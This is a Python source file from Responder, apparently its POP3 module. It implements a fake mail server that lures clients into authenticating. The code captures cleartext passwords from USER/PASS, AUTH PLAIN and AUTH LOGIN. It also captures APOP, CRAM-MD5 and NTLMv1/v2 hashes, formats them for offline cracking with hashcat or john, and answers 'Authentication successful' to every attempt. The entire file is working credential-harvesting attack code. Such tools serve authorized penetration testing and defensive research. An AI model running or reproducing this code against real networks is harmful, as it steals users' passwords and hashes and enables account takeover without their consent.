#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from utils import *
import base64
import hashlib
import codecs
import struct

if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler
from packets import POPOKPacket, POPNotOKPacket

class POP3(BaseRequestHandler):
	"""POP3 server with multiple authentication methods"""
	
	def __init__(self, *args, **kwargs):
		self.challenge = None
		self.username = None
		BaseRequestHandler.__init__(self, *args, **kwargs)
	
	def generate_challenge(self):
		"""Generate challenge for APOP and CRAM-MD5"""
		import time
		import random
		timestamp = int(time.time())
		random_data = random.randint(1000, 9999)
		# APOP format: <process-id.clock@hostname>
		self.challenge = "<%d.%d@%s>" % (random_data, timestamp, settings.Config.MachineName)
		return self.challenge
	
	def send_packet(self, packet):
		"""Send a packet to client"""
		self.request.send(NetworkSendBufferPython2or3(packet))
	
	def send_ok(self, message=""):
		"""Send +OK response"""
		if message:
			response = "+OK %s\r\n" % message
		else:
			response = "+OK\r\n"
		self.request.send(response.encode('latin-1'))
	
	def send_err(self, message=""):
		"""Send -ERR response"""
		if message:
			response = "-ERR %s\r\n" % message
		else:
			response = "-ERR\r\n"
		self.request.send(response.encode('latin-1'))
	
	def send_continue(self, data=""):
		"""Send continuation (+) response for multi-line auth"""
		if data:
			response = "+ %s\r\n" % data
		else:
			response = "+\r\n"
		self.request.send(response.encode('latin-1'))
	
	def handle_apop(self, data):
		"""Handle APOP authentication (MD5 challenge-response)"""
		# APOP username digest
		# digest is MD5(challenge + password)
		try:
			parts = data.strip().split(b' ', 2)
			if len(parts) < 3:
				return False
			
			username = parts[1].decode('latin-1')
			digest = parts[2].decode('latin-1').lower()
			
			# Format for hashcat/john: username:$apop$challenge$digest
			hash_string = "%s:$apop$%s$%s" % (username, self.challenge, digest)
			
			SaveToDb({
				'module': 'POP3',
				'type': 'APOP',
				'client': self.client_address[0],
				'user': username,
				'hash': digest,
				'fullhash': hash_string,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [POP3] Captured APOP digest from %s for user %s" % (
					self.client_address[0].replace("::ffff:", ""), username), 3, 1))
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[POP3] Error parsing APOP: %s' % str(e)))
			return False
	
	def handle_auth_plain(self, data):
		"""Handle AUTH PLAIN (base64 encoded username/password)"""
		try:
			# AUTH PLAIN can be sent as:
			# AUTH PLAIN <base64>
			# or
			# AUTH PLAIN
			# <base64>
			
			if len(data.strip().split(b' ')) > 2:
				# Inline format
				auth_data = data.strip().split(b' ', 2)[2]
			else:
				# Need to read next line
				self.send_continue()
				auth_data = self.request.recv(1024).strip()
			
			# Decode base64
			decoded = base64.b64decode(auth_data)
			# Format: [authzid]\x00username\x00password
			parts = decoded.split(b'\x00')
			
			if len(parts) >= 3:
				username = parts[1].decode('latin-1', errors='ignore')
				password = parts[2].decode('latin-1', errors='ignore')
			elif len(parts) == 2:
				username = parts[0].decode('latin-1', errors='ignore')
				password = parts[1].decode('latin-1', errors='ignore')
			else:
				return False
			
			SaveToDb({
				'module': 'POP3',
				'type': 'AUTH-PLAIN',
				'client': self.client_address[0],
				'user': username,
				'cleartext': password,
				'fullhash': username + ":" + password,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [POP3] Captured AUTH PLAIN credentials from %s for user %s" % (
					self.client_address[0].replace("::ffff:", ""), username), 2, 1))
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[POP3] Error parsing AUTH PLAIN: %s' % str(e)))
			return False
	
	def handle_auth_login(self, data):
		"""Handle AUTH LOGIN (two-stage base64 authentication)"""
		try:
			# AUTH LOGIN is two-stage:
			# Client: AUTH LOGIN
			# Server: + VXNlcm5hbWU6  (base64 "Username:")
			# Client: <base64 username>
			# Server: + UGFzc3dvcmQ6  (base64 "Password:")
			# Client: <base64 password>
			
			# Send "Username:" prompt
			self.send_continue(base64.b64encode(b"Username:").decode('latin-1'))
			username_b64 = self.request.recv(1024).strip()
			
			if not username_b64:
				return False
			
			username = base64.b64decode(username_b64).decode('latin-1', errors='ignore')
			
			# Send "Password:" prompt
			self.send_continue(base64.b64encode(b"Password:").decode('latin-1'))
			password_b64 = self.request.recv(1024).strip()
			
			if not password_b64:
				return False
			
			password = base64.b64decode(password_b64).decode('latin-1', errors='ignore')
			
			SaveToDb({
				'module': 'POP3',
				'type': 'AUTH-LOGIN',
				'client': self.client_address[0],
				'user': username,
				'cleartext': password,
				'fullhash': username + ":" + password,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [POP3] Captured AUTH LOGIN credentials from %s for user %s" % (
					self.client_address[0].replace("::ffff:", ""), username), 2, 1))
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[POP3] Error parsing AUTH LOGIN: %s' % str(e)))
			return False
	
	def handle_auth_cram_md5(self, data):
		"""Handle AUTH CRAM-MD5 (challenge-response)"""
		try:
			# Generate challenge
			import time
			challenge = "<%d.%d@%s>" % (os.getpid(), int(time.time()), settings.Config.MachineName)
			challenge_b64 = base64.b64encode(challenge.encode('latin-1')).decode('latin-1')
			
			# Send challenge
			self.send_continue(challenge_b64)
			
			# Receive response
			response_b64 = self.request.recv(1024).strip()
			if not response_b64:
				return False
			
			response = base64.b64decode(response_b64).decode('latin-1', errors='ignore')
			# Response format: username<space>digest
			parts = response.split(' ', 1)
			
			if len(parts) < 2:
				return False
			
			username = parts[0]
			digest = parts[1].lower()
			
			# Format for hashcat: $cram_md5$challenge$digest$username
			hash_string = "%s:$cram_md5$%s$%s" % (username, challenge, digest)
			
			SaveToDb({
				'module': 'POP3',
				'type': 'CRAM-MD5',
				'client': self.client_address[0],
				'user': username,
				'hash': digest,
				'fullhash': hash_string,
			})
			
			if settings.Config.Verbose:
				print(color("[*] [POP3] Captured CRAM-MD5 hash from %s for user %s" % (
					self.client_address[0].replace("::ffff:", ""), username), 3, 1))
			
			return True
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[POP3] Error parsing CRAM-MD5: %s' % str(e)))
			return False
	
	def handle_ntlm_auth(self, data):
		"""Handle NTLM authentication"""
		try:
			# Check for NTLMSSP NEGOTIATE
			if b'NTLMSSP\x00\x01' in data:
				# Generate NTLM challenge
				challenge = RandomChallenge()
				
				# Build NTLMSSP CHALLENGE
				ntlm_challenge = b'NTLMSSP\x00'
				ntlm_challenge += struct.pack('<I', 2)  # Type 2
				ntlm_challenge += struct.pack('<HHI', 0, 0, 0)  # Target name
				ntlm_challenge += struct.pack('<I', 0x00008201)  # Flags
				ntlm_challenge += challenge  # Server challenge
				ntlm_challenge += b'\x00' * 8  # Reserved
				ntlm_challenge += struct.pack('<HHI', 0, 0, 0)  # Target info
				
				# Send challenge (base64 encoded in continuation)
				challenge_b64 = base64.b64encode(ntlm_challenge).decode('latin-1')
				self.send_continue(challenge_b64)
				
				# Receive NTLMSSP AUTH
				auth_b64 = self.request.recv(2048).strip()
				if not auth_b64 or auth_b64 == b'*':
					return False
				
				auth_data = base64.b64decode(auth_b64)
				
				# Parse NTLMSSP AUTH
				if auth_data[0:8] != b'NTLMSSP\x00':
					return False
				
				msg_type = struct.unpack('<I', auth_data[8:12])[0]
				if msg_type != 3:
					return False
				
				# Parse fields
				lm_len = struct.unpack('<H', auth_data[12:14])[0]
				lm_offset = struct.unpack('<I', auth_data[16:20])[0]
				
				ntlm_len = struct.unpack('<H', auth_data[20:22])[0]
				ntlm_offset = struct.unpack('<I', auth_data[24:28])[0]
				
				domain_len = struct.unpack('<H', auth_data[28:30])[0]
				domain_offset = struct.unpack('<I', auth_data[32:36])[0]
				
				user_len = struct.unpack('<H', auth_data[36:38])[0]
				user_offset = struct.unpack('<I', auth_data[40:44])[0]
				
				# Extract data
				username = auth_data[user_offset:user_offset+user_len].decode('utf-16-le', errors='ignore')
				domain = auth_data[domain_offset:domain_offset+domain_len].decode('utf-16-le', errors='ignore')
				lm_hash = auth_data[lm_offset:lm_offset+lm_len]
				ntlm_hash = auth_data[ntlm_offset:ntlm_offset+ntlm_len]
				
				# Determine version
				if ntlm_len == 24:
					hash_type = "NTLMv1"
					hash_string = "%s::%s:%s:%s:%s" % (
						username, domain,
						codecs.encode(lm_hash, 'hex').decode('latin-1'),
						codecs.encode(ntlm_hash, 'hex').decode('latin-1'),
						codecs.encode(challenge, 'hex').decode('latin-1')
					)
				elif ntlm_len > 24:
					hash_type = "NTLMv2"
					hash_string = "%s::%s:%s:%s:%s" % (
						username, domain,
						codecs.encode(challenge, 'hex').decode('latin-1'),
						codecs.encode(ntlm_hash[:16], 'hex').decode('latin-1'),
						codecs.encode(ntlm_hash[16:], 'hex').decode('latin-1')
					)
				else:
					return False
				
				SaveToDb({
					'module': 'POP3',
					'type': hash_type + '-SSP',
					'client': self.client_address[0],
					'user': domain + '\\' + username,
					'hash': codecs.encode(ntlm_hash, 'hex').decode('latin-1'),
					'fullhash': hash_string,
				})
				
				if settings.Config.Verbose:
					print(color("[*] [POP3] Captured %s hash from %s for user %s\\%s" % (
						hash_type, self.client_address[0].replace("::ffff:", ""), domain, username), 3, 1))
				
				return True
			
			return False
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[POP3] Error parsing NTLM: %s' % str(e)))
			return False
	
	def SendPacketAndRead(self):
		"""Send OK packet and read response"""
		Packet = POPOKPacket()
		self.request.send(NetworkSendBufferPython2or3(Packet))
		return self.request.recv(1024)
	
	def handle(self):
		try:
			# Generate challenge for APOP
			challenge = self.generate_challenge()
			
			# Send banner with challenge for APOP support
			banner = "+OK POP3 server ready %s\r\n" % challenge
			self.request.send(banner.encode('latin-1'))
			
			# Read first command
			data = self.request.recv(1024)
			
			# Handle CAPA (capability) command
			if data[0:4].upper() == b'CAPA':
				# Advertise supported auth methods
				capabilities = [
					"+OK Capability list follows",
					"USER",
					"SASL PLAIN LOGIN CRAM-MD5 NTLM",
					"IMPLEMENTATION Responder POP3",
					"."
				]
				self.request.send("\r\n".join(capabilities).encode('latin-1') + b"\r\n")
				data = self.request.recv(1024)
			
			# Handle AUTH command
			if data[0:4].upper() == b'AUTH':
				mechanism = data[5:].strip().upper()
				
				if mechanism == b'PLAIN':
					self.handle_auth_plain(data)
					self.send_ok("Authentication successful")
					return
				
				elif mechanism == b'LOGIN':
					self.handle_auth_login(data)
					self.send_ok("Authentication successful")
					return
				
				elif mechanism == b'CRAM-MD5' or mechanism.startswith(b'CRAM'):
					self.handle_auth_cram_md5(data)
					self.send_ok("Authentication successful")
					return
				
				elif mechanism == b'NTLM':
					if self.handle_ntlm_auth(data):
						self.send_ok("Authentication successful")
					else:
						self.send_err("Authentication failed")
					return
				
				elif not mechanism:
					# AUTH without mechanism - list supported
					auth_list = "+OK Supported mechanisms:\r\nPLAIN\r\nLOGIN\r\nCRAM-MD5\r\nNTLM\r\n.\r\n"
					self.request.send(auth_list.encode('latin-1'))
					data = self.request.recv(1024)
				else:
					self.send_err("Unsupported authentication method")
					return
			
			# Handle APOP command
			if data[0:4].upper() == b'APOP':
				if self.handle_apop(data):
					self.send_ok("Authentication successful")
				else:
					self.send_err("Authentication failed")
				return
			
			# Handle traditional USER/PASS
			if data[0:4].upper() == b'USER':
				User = data[5:].strip(b"\r\n").decode("latin-1", errors='ignore')
				self.send_ok("Password required")
				data = self.request.recv(1024)
				
				if data[0:4].upper() == b'PASS':
					Pass = data[5:].strip(b"\r\n").decode("latin-1", errors='ignore')
					
					SaveToDb({
						'module': 'POP3',
						'type': 'Cleartext',
						'client': self.client_address[0],
						'user': User,
						'cleartext': Pass,
						'fullhash': User + ":" + Pass,
					})
					
					if settings.Config.Verbose:
						print(color("[*] [POP3] Captured cleartext credentials from %s for user %s" % (
							self.client_address[0].replace("::ffff:", ""), User), 2, 1))
					
					self.send_ok("Authentication successful")
					return
			
			self.send_err("Unknown command")
			
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[POP3] Exception: %s' % str(e)))
			pass
